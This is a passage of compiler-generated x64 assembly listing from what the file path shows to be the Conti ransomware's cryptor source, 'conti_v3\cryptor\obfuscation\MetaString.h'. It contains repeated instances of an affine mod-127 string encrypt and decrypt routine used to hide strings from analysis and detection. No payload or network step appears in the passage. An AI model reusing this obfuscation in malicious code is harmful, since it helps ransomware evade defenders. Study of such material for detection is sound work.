  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 40	 add	 r8d, 64			; 00000040H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 45	 sub	 eax, 69			; 00000045H
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 45	 add	 r8d, 69			; 00000045H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 66 00 00 00	 mov	 ecx, 102		; 00000066H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 66	 add	 r8d, 102		; 00000066H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 79	 sub	 eax, 121		; 00000079H
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 79	 add	 r8d, 121		; 00000079H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 54 00 00 00	 mov	 ecx, 84			; 00000054H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4b	 sub	 eax, 75			; 0000004bH
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4b	 add	 r8d, 75			; 0000004bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::encrypt
